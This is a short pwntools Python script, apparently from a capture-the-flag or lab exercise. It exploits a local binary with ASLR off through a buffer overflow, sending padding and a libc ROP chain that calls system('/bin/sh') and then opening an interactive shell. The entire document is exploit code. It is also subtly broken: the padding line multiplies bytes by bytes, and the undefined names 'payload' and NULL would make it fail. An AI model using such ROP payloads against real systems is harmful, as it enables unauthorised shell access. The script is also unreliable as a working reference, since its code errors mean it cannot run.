from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.aslr = False
context.log_level = 'error'

io = process('/home/stage2/stage2-noaslr')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x7ffff7c00000
rop_chain = ROP(libc)

offset = cyclic(80)
junk = b'A' * offset
addr_bin_sh = next(libc.search(b"/bin/sh"))
rop_chain.system(addr_bin_sh, NULL, NULL)

file = open('payload', 'wb')
file.write(payload)
file.close()

io.send(junk + bytes(rop_chain))
io.interactive()